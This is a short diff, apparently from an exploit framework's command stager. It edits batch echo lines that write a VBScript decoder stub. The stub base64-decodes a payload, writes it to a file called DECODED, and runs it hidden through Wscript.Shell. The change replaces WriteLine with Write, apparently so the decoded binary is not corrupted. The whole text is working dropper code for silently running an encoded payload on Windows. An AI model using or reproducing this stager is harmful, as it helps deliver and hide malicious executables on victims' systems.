@@ -7,7 +7,7 @@ echo data = Replace(data, vbCrLf, "") >>decode_stub
 echo data = base64_decode(data) >>decode_stub
 echo fd.Close >>decode_stub
 echo Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile("DECODED", 2, True) >>decode_stub
-echo ofs.WriteLine data >>decode_stub
+echo ofs.Write data >>decode_stub
 echo ofs.close >>decode_stub
 echo Set shell = CreateObject("Wscript.Shell") >>decode_stub
 echo shell.run "DECODED", 0, false >>decode_stub
